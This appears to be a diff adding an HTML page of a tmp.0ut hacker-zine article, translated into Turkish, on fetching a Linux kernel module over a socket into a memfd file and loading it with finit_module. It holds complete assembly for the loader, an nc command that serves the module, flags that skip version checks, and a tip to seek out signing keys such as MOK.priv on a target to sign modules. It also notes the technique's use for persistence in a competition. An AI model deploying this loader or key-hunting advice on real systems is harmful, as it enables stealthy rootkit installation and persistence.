@@ -1,0 +1,302 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+Hafızada Kernel Modülü Yükleme
+~ netspooky
+
+Geçen yıl Linux çekirdeği üzerinde yapılan değişiklikler sonucu kullandığımız "binary golf" 
+metodolojilerinin eskide kalmasıyla yabancı kaynaklardan gelen kernel modüllerini yüklemenin
+eğlenceli olabileceğini düşündüm. Bu yaklaşımı için LKM (Linux Kernel Modülü) yükleyicisi
+için iki yararlı sistem çağrısını tartışacağız.
+
+───[ Test Modülü Oluşturma ]───────────────────────────────────────────────────
+
+Test için basit bir çekirdek modülü oluşturarark başlayacağız. 
+Yapacağı tek şey kernel bufferında mesaj bastırmak olacak.
+(dmesg komutuyla gözlemleyebileceğiz)
+
+
+    // bang.c
+    #include &lt;linux/module.h&gt;
+    #include &lt;linux/init.h&gt;
+    
+    MODULE_LICENSE("GPL");
+    
+    static int __init he(void) {
+        printk(KERN_INFO"we out here :}\n");
+        return 0;
+    }
+    
+    static void __exit le(void) {
+        printk(KERN_INFO"we are no longer out here :{\n");
+    }
+    
+    module_init(he);
+    module_exit(le);
+
+Build işlemi için aşağıdaki gibi basit bir Makefile kullanıyoruz:
+
+    obj-m += bang.o
+    dir = $(shell uname -rm | sed -e 's/\s/\-/')
+    
+    all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+    
+    strip: all
+        strip bang.ko
+        mkdir -p $(dir)
+        cp -v bang.ko $(dir)/he.ko
+    
+    load: all
+        sudo insmod bang.ko
+    
+    unload:
+        sudo rmmod bang
+    
+    clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+Modülü oluşturmak için `make` komutunu çalıştırmanız yeterli.
+
+42000 portunda çalıştırabilmek için `cat bang.ko | nc -l -lvp 420000` komutunu kullanabilirsiniz.
+
+───[ Yükleyici ]───────────────────────────────────────────────────────────────
+
+Kullanacağımız modül yükleyici epey düz ve sade olacak, ancak ben yine de bu tekniği daha 
+sonra geliştirmek üzere öğrenenler için detaylıca anlatıyor olacağım.
+
+Modülü direkt hafızaya indireceğiz. Bunun için önceklikle sunucumuzda(127.0.0.1:42000)
+kernel moülünü barındıracak bir soket açıyoruz. Sonrasında hedefte modülü 
+indirebilmek için bir memfd dosyası yaratacağız.
+
+memfd_create sistem çağrısı hafızada dosya sistemiyle ilişkisi olmayan geçici dosyalar
+oluşturmak için kullanılmaktadır. Bu nedenle programın çalışma süresince kullanılacak
+dosyaları oluşturmak için tercih edilen bir çağrıdır, ayrıca geçici olarak dosya 
+yolu ve dosya tanımlayıcısı (file descriptor) sağlamaktadır.
+
+/proc/self/fd/4 üzerinden memfd dosyasının çalıştırıldığı örnek kod parçasına şu linkten ulaşabilirsiniz:
+  https://github.com/netspooky/golfclub/blob/master/linux/dl_memfd_219.asm#L100
+
+memfd dosyamızı oluşturduktan sonra, uzak sunucunun soketinden değer okuyup dosya tanımlayıcımızı kullanarak oluşturduğumuz memfd dosyasına yazıyoruz. 
+
+memfd dosyasına yazma işleminin bitmesinin ardından finit_module sistem çağrısını kullanıp dosya tanımlayıcısı aracılığıyla kernel modülümüzü yüklüyoruz.
+
+
+───[ kl.asm ]───────────────────────────────────────────────────────────────────
+
+;-- 127.0.0.1:42000 Adresinden çekirdek modülünü hafızaya indir ve yükle -------//--
+;  __  __ .   __  __  __  __ .  .  . setup:
+; |  ||__||_ |__ |__||  ||  ||_/|  |   $ cat somekernelmodule.ko | nc -lvp 42000
+; |  ||   |     ||   |o ||o ||\ |__| build:
+; |  ||__ |__ __||   |__||__|| \ __|   $ nasm -f elf64 kl.asm ; ld kl.o -o kl
+;-------------------------------------------------------------------------------
+section .text
+global _start
+_start:
+; socket çağrısı -----------------------------------------------------------------------
+; Soket bağlantısını ayarlama
+; int socket(int domain, int type, int protocol);
+;  rdi = int domain
+;  rsi = int type
+;  rdx = int protocol 
+;-------------------------------------------------------------------------------
+  push byte 0x29               ; Soket sistem çağrısını yığına ekle
+  pop rax                      ; RAX = Soket sistem çağrısı
+  push byte 0x2                ; Domaini ekle: AF_INET
+  pop rdi                      ; RDI = AF_INET
+  push byte 0x1                ; Soket tipini ekle: SOCK_STREAM
+  pop rsi                      ; RSI = SOCK_STREAM
+  cdq                          ; RDX = 0
+  syscall                      ; Soket sistem çağrısını çalıştır
+; connect çağrısı ----------------------------------------------------------------------
+; Dosya bufferını kaydetmek için sokete bağlandığımız kısım
+; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+;  rdi = int sockfd
+;  rsi = const struct sockaddr *addr
+;  rdx = socklen_t addrlen
+;-------------------------------------------------------------------------------
+  xchg rdi, rax                ; int sockfd
+  mov rbx, rdi                 ; Sonrası için sockfd değerini rbx'e kaydet
+  mov dword [rsp-4], 0x100007F ; IP adresi   = 127.0.0.1
+  mov word  [rsp-6], 0x10A4    ; Port = 42000
+  mov byte  [rsp-8], 0x02      ; sockfd
+  sub rsp, 8                   ; Line up
+  push byte 0x2a               ; Sokete bağlanma sistem çağrısını yığına ekle
+  pop rax                      ; RAX = "connect" sistem çağrısı
+  mov rsi, rsp                 ; const struct sockaddr *addr
+  push byte 0x10               ; boyut
+  pop rdx                      ; boyut -&gt; rdx
+  syscall                      ; "connect" sistem çağrısını çalıştır
+; memfd_create çağrısı ---------------------------------------------------------------
+; Soket bufferını kaydetmek için sanal bir dosya oluşturduğumuz kısım
+; int memfd_create(const char *name, unsigned int flags);
+;  rdi = const char *pathname
+;  rsi = int flags
+;-------------------------------------------------------------------------------
+  mov ax, 0x13f                ; Sistem çağrısı
+  push 0x474e4142              ; Sanal dosya adı: BANG (Little Endian dolayısıyla GNAB )
+  mov rdi, rsp                 ; Arg0: Dosya adı
+  xor rsi, rsi                 ; int flags
+  syscall                      ; "memfd_create" çağrısını çalıştır
+; read çağrısı -------------------------------------------------------------------------
+; Soket bufferını yerel bir dosyaya kaydedebilmek için başka bir buffer ile okuduğumuz kısım
+; ssize_t read(socket sockfd,buf,len)
+;  rdi = int fd  
+;  rsi = void *buf 
+;  rdx = size_t count     
+;-------------------------------------------------------------------------------
+  mov r9, rax                  ; Yerel dosya tanımlayıcısını kaydet
+  mov rdx, 0x400               ; size_t count = 1024 byte
+rwloop:
+  mov rdi, rbx                 ; "sockFD" değerini RDI kaydedicisine taşı
+  xor rax, rax                 ; 0 "read" sistem çağrısını temsil ediyor
+  lea rsi, [rsp-1024]          ; (output - arg1 *buf) sonuncunu bufferda sakla
+  syscall                      ; "read" sistem çağrısını çalıştır
+; write çağrısı ------------------------------------------------------------------------
+; Soket bufferını yerel dosyaya yazdığımız kısım
+; ssize_t sys_write(fd,*buf,count)
+;  rdi = int fd  
+;  rsi = const *buf 
+;  rdx = size_t count     
+;-------------------------------------------------------------------------------
+  mov rdi, r9                  ; Yazılacak yerel dosyanın tanımlayıcısını kaydet
+  mov rdx, rax                 ; RDX = # okunan byteları temsil ediyor, 0 dosya sonu demek
+  xor rax, rax                 ; RAX = 0
+  mov al, 1                    ; "1" Sistem çağrısının numarasını kaydet
+  syscall                      ; "write" çağrısını çalıştır
+  cmp dx, 0x400                ; Okunacak byte olup olmadığını kontrol et
+  je rwloop                    ; Okunacak byte varsa döngüye devam et
+; finit_module -----------------------------------------------------------------
+; Dosya tanımlayısı ile çekirdek modülünü yüklediğimiz kısım
+; int finit_module(int fd, const char *param_values, int flags);
+;  rdi = int fd - The file descriptor
+;  rsi = const char *param_values
+;  rdx = int flags
+;-------------------------------------------------------------------------------
+  xor rax, rax                 ; RAX = 0
+  push rax                     ; param_values
+  mov rsi, rsp                 ; RSI = *param_values
+  mov rax, 0x139               ; "finit_module" çağrısını kaydet
+  mov rdi, r9                  ; int fd
+  xor rdx, rdx                 ; int flags 
+  syscall                      ; "finit_module" çağrısını çalıştır
+;--- Çıkış ----------------------------------------------------------------------
+; void exit(int status);
+;  rdi = int status
+;-------------------------------------------------------------------------------
+  mov rax, 0x3c                ; "exit" sistem çağrısını kaydet
+  mov rdi, 0x45                ; Bütünlüğü kontrol edebilmek için 69 değerini döndür
+  syscall                      ; Çıkışş
+
+───[ finit_module flags ]───────────────────────────────────────────────────────
+
+Linuxta kernel modülü yüklemek için finit_module sistem çağrısını kullanmak ilginç bir yöntem. 
+Normalde, init_module sistem çağrısı hafızadaki bir pointer'dan modül yükleyebiliyor.
+Ancak finit_module sistem çağrısı dosya tanımlayıcısıyla modül yüklemek için kullanılabilmekle
+beraber, bir modül imajı yüklenirken sistem tarafından yapılan kontrolleri atlatmak için
+eşsiz yöntemler sağlıyor. NOT: finit_module çağrısının flag değerleri ancak hedef 
+çekirdek build edilirken modülü her koşulda yükleme (force load) özelliği açıksa kullanılabilir olmaktadır.
+(detaylar için bir sonraki bölüme bakın)
+
+Geçersiz kılınması gereken flag değerleri include/uapi/linux/module.h dosyasında tanımlanmış
+olup "OR" işlemine tabi tutulduktan sonra RDX'te bulunan sistem çağrısı tarafından kullanılmaktadır.
+
+    /* sys_finit_module için flag değerleri: */
+    #define MODULE_INIT_IGNORE_MODVERSIONS  1
+    #define MODULE_INIT_IGNORE_VERMAGIC     2
+
+MODULE_INIT_IGNORE_MODVERSIONS flag değeri sembollerin versiyon hashlerini, 
+MODULE_INIT_IGNORE_VERMAGIC değeri ise kernel versiyonunu belirten byte değerlerini 
+gözardı etmek için kullanılmaktadır. Söz konusu flag değerleri modülün kernele yüklenmesi
+için kullanılmak zorundadır, yoksa modülün yükleme işlemi başarısız olacaktır. Bu durum kernelde
+tanımlanmayan davranış olarak değerlendirilmeye ve kernelin sıkıntı çıkartmasına sebep olabilir,
+dolayısıyla bahsettiğimiz flag değerlerini kullanırken dikkatli olun!
+
+finit_module ile modül yükleme aşağıda belirttiğim gibi tanımlanmaktadır:
+
+  ..kernel modülünün güvenilirliği modülün dosya sistemindeki yerinden yola çıkılarak belirlenemiyorsa; 
+  mümkün olduğu takdirde, modülün özgünlüğünü doğrulamak için kriptografik olarak imzalanmış modülleri
+  kullanma zorunluluğu gözardı edilebilir.
+
+  - man 2 finit_module
+
+───[ Determining Compatibility ]────────────────────────────────────────────────
+
+Kernel modülü yükleme işlemindeki zorlu kısım, kimi modüllerin çalıştırılması ya da 
+çalıştırılmamasına neden olan farklı konfigürasyonların bulunmasından ya da modülü
+çekirdeğe yüklemede kullanılan yollardan kaynaklanmaktadır. Aşağıda modülünüzü 
+yüklemeden önce bilmeniz gereken birkaç tane kernel konfigürasyonuna yer verdim.
+
+::: CONFIG_MODVERSIONS :::
+
+Bu flag değeri aktive edildiğinde (CONFIG_MODVERSIONS=y) farklı çekirdekler
+için derlenmiş kernel modüllerini yükleyebilirsiniz. 
+
+Kontrol etmek için: 
+
+  $ grep CONFIG_MODVERSIONS /boot/config-KERNELVERSIYONUNUZ
+  CONFIG_MODVERSIONS=y
+
+Daha fazla bilgi için: https://cateee.net/lkddb/web-lkddb/MODVERSIONS.html
+
+::: CONFIG_MODULE_SIG_FORCE :::
+
+Bu flag değeri aktive edilmişse imzalanmamış modülleri yükleyemezsiniz.
+
+Kontrol etmek için:
+
+  $ grep CONFIG_MODULE_SIG_FORCE /boot/config-KERNELVERSIYONUNUZ
+  # CONFIG_MODULE_SIG_FORCE açık değil
+
+Daha fazla bilgi için: https://cateee.net/lkddb/web-lkddb/MODULE_SIG_FORCE.html
+
+PROTIP: Hedeflediğiniz sistem için sisteminizde normalde bulunan güvenilir anahtarları araştırıp kullanabilirsiniz.
+
+Örneğin;
+
+  /var/lib/shim-signed/mok/MOK.priv &amp; /var/lib/shim-signed/mok/MOK.der 
+  /usr/src/LINUX/certs/signing_key.pem &amp; /usr/src/LINUX/certs/signing_key.x509
+
+::: CONFIG_MODULE_FORCE_LOAD :::
+
+Bu konfigürasyonun aktif olması durumunda versiyon bilgisine gerek duymadan modülünüzü
+yükleyebilirsiniz. Eğer finit_module çağrısı için flag değerlerini kullanacaksanız bu
+konfigürasyon mutlaka aktif olmalıdır. Şayet açık değilse ancak yine de finit_module
+flag değerlerini kullanarak versiyon bilgisini görmezden gelmeye çalışırsanız, ENOEXEC
+hatası verecektir. 
+
+Kontrol etmek için: 
+
+  $ grep CONFIG_MODULE_FORCE_LOAD /boot/config-YOURKERNELVERSION
+  # CONFIG_MODULE_FORCE_LOAD açık değil
+
+Daha fazla bilgi için: https://cateee.net/lkddb/web-lkddb/MODULE_FORCE_LOAD.html
+
+───[ .fini ]────────────────────────────────────────────────────────────────────
+
+Bu tekniği ufak kernel modüllerini denerken ve yükleyicileri test ederken kullanıyorduk. 
+Benzer şekilde, WRCCDC esnasında tek satırlık bir komutla aynı konfigürasyona sahip 
+birden fazla makinede kalıcılık sağlamak için kullanılmıştı. 
+
+Bahsettiğimiz bu teknik bir kernel modülü yüklemek için kullanılan birçok yöntemden yalnızca biri.
+Hala keşfedecek çok şey var, ve umuyorum ki bu yazı size bir şeylerle uğraşmak için ilham vermiştir!
+
+Buradan tmp.0ut, thugcrowd, vxug ve tcpd topluluklarındaki herkese selam yolluyorum.
+
+Bu arada tmp.0ut'un yeni sayılarında çıkacak "ELF Binary Mangling" makalesine bakmayı unutmayın!
+</pre></div></center></body></html>
